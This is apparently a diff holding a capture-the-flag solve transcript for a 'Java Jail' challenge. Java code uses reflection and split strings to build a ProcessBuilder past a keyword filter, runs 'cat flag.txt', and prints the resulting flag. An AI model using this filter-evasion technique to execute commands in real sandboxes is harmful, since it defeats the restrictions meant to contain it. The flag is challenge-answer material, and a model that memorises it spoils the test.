@@ -1,0 +1,33 @@
+
+      Welcome to the Java Jail.
+      Have fun coding in Java!
+      
+Enter in your code below (will be written to Main.java), end with --EOF--
+
+
+public class Main {
+  public static void main(String... args) {
+    try {
+      System.setErr(System.out);
+      System.out.println("Running...");
+
+      String[ ] cmd = {"cat", "flag" + ".txt"};
+
+      Class<?> pb = Main.class.forName("java.lang.Proc" + "essBuilder");
+      Object[ ] ins_args = {cmd};
+      Object ins = Main.class.forName("java.lang.reflect.Constructor").getMethod("ne" + "wInstance", Object[ ].class)
+        .invoke(pb.getConstructor(String[ ].class), (Object) ins_args);
+
+      pb.getMethod("inheritIO").invoke(ins);
+      pb.getMethod("start").invoke(ins);
+    } catch (Throwable thr) {
+      thr.printStackTrace();
+    }
+  }
+}
+
+--EOF--
+Here's your output:
+Running...
+amateursCTF{r3flect3d_4cr055_all_th3_fac35}
+
